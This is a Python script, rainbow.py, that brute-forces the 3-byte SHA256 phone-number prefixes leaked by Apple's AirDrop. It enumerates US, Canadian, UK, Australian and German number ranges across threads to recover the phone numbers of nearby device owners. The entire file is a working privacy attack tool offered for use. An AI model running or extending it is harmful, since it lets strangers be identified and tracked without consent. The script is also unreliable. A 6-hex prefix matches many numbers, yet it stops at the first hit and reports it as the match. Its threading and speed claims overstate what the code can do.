#!/usr/bin/env python3
"""
tools/rainbow.py — AirDrop Phone Hash Brute-Forcer

Apple's AirDrop leaks the first 3 bytes (6 hex chars) of
SHA256("+CountryCodePhoneNumber") to identify devices.

This tool brute-forces those hashes against phone number ranges
for US (+1), UK (+44), AU (+61), CA (+1), and DE (+49).

Usage:
    python tools/rainbow.py <hash> [hash2 ...]
    python tools/rainbow.py --file hashes.txt
    python tools/rainbow.py a3b2c1 --country US --threads 8

Output:
    a3b2c1  →  +12025551234  (US)

Performance: ~2-4M hashes/sec per thread on modern hardware
US numbers: ~10B → ~40min single-thread, ~5min 8 threads
"""

import argparse
import hashlib
import itertools
import sys
import threading
import time
from queue import Queue

COUNTRY_RANGES = {
    "US": [("+1", 10)],   # +1 XXXXXXXXXX  (10 digits)
    "CA": [("+1", 10)],
    "UK": [("+44", 10)],  # +44 XXXXXXXXXX
    "AU": [("+61", 9)],   # +61 XXXXXXXXX
    "DE": [("+49", 11)],  # +49 XXXXXXXXXXX
}

RESET = "\033[0m"; BOLD = "\033[1m"; GREEN = "\033[92m"
CYAN  = "\033[96m"; DIM = "\033[2m"; RED = "\033[91m"


def _hash_prefix(number: str) -> str:
    """Return first 3 bytes (6 hex chars) of SHA256(number)."""
    return hashlib.sha256(number.encode()).hexdigest()[:6]


def _worker(prefix: str, country_code: str, digits: int,
            start: int, end: int, found: list, stop_evt: threading.Event,
            progress_q: Queue):
    batch = 100_000
    for i in range(start, end, batch):
        if stop_evt.is_set():
            return
        chunk_end = min(i + batch, end)
        for n in range(i, chunk_end):
            if stop_evt.is_set():
                return
            num = f"{country_code}{str(n).zfill(digits)}"
            if _hash_prefix(num) == prefix:
                found.append(num)
                stop_evt.set()
                return
        progress_q.put(chunk_end - i)


def crack(target_hash: str, countries: list = None, threads: int = 4,
          verbose: bool = True) -> list:
    """
    Attempt to crack a 3-byte AirDrop phone hash.
    Returns list of matching phone numbers (usually 0 or 1).
    """
    target = target_hash.lower().strip()
    if len(target) < 6:
        print(f"{RED}Hash too short — need 6 hex chars (3 bytes){RESET}")
        return []

    prefix = target[:6]
    if verbose:
        print(f"\n{BOLD}{CYAN}  AirDrop Hash Cracker{RESET}")
        print(f"  Target : {BOLD}{prefix}{RESET}")
        print(f"  Threads: {threads}")
        print()

    found   = []
    results = []

    for country in (countries or list(COUNTRY_RANGES.keys())):
        if country not in COUNTRY_RANGES:
            continue
        for cc, digit_count in COUNTRY_RANGES[country]:
            total = 10 ** digit_count
            chunk = total // threads
            stop_evt = threading.Event()
            progress_q: Queue = Queue()
            worker_threads = []

            if verbose:
                print(f"  {DIM}Scanning {country} ({cc}) — {total:,} numbers ...{RESET}", end="", flush=True)

            t0 = time.time()
            for i in range(threads):
                s = i * chunk
                e = s + chunk if i < threads - 1 else total
                t = threading.Thread(
                    target=_worker,
                    args=(prefix, cc, digit_count, s, e, found, stop_evt, progress_q),
                    daemon=True
                )
                t.start()
                worker_threads.append(t)

            for t in worker_threads:
                t.join()

            elapsed = time.time() - t0
            if found:
                for num in found:
                    if verbose:
                        print(f"\r  {GREEN}{BOLD}MATCH{RESET}  {prefix}  →  {BOLD}{num}{RESET}  ({country}, {elapsed:.1f}s)")
                    results.append({"hash": prefix, "number": num, "country": country})
                found.clear()
                break   # stop scanning other countries once found
            else:
                if verbose:
                    rate = total / elapsed / 1e6
                    print(f"\r  {DIM}No match in {country} ({elapsed:.1f}s, {rate:.1f}M/s){RESET}")

    if not results and verbose:
        print(f"\n  {RED}No match found.{RESET} Hash may be email/Apple ID, or number outside scanned ranges.\n")

    return results


def main():
    ap = argparse.ArgumentParser(
        description="Brute-force AirDrop 3-byte phone hash → phone number"
    )
    ap.add_argument("hashes", nargs="*", help="Hash(es) to crack (6 hex chars each)")
    ap.add_argument("--file",     "-f", help="File with one hash per line")
    ap.add_argument("--country",  "-c", nargs="+",
                    choices=list(COUNTRY_RANGES.keys()),
                    default=list(COUNTRY_RANGES.keys()),
                    help="Country codes to scan (default: all)")
    ap.add_argument("--threads",  "-t", type=int, default=4,
                    help="Worker threads (default: 4)")
    ap.add_argument("--output",   "-o", help="Write results to file")
    args = ap.parse_args()

    targets = list(args.hashes)
    if args.file:
        with open(args.file) as fh:
            targets += [l.strip() for l in fh if l.strip()]

    if not targets:
        ap.print_help()
        sys.exit(1)

    all_results = []
    for h in targets:
        res = crack(h, countries=args.country, threads=args.threads)
        all_results.extend(res)

    if all_results:
        print(f"\n{BOLD}{GREEN}Results:{RESET}")
        for r in all_results:
            print(f"  {r['hash']}  →  {r['number']}  ({r['country']})")

        if args.output:
            import json
            with open(args.output, "w") as fh:
                json.dump(all_results, fh, indent=2)
            print(f"\n  Saved to {args.output}")
    else:
        print(f"\n{RED}No hashes cracked.{RESET}")
        sys.exit(1)


if __name__ == "__main__":
    main()
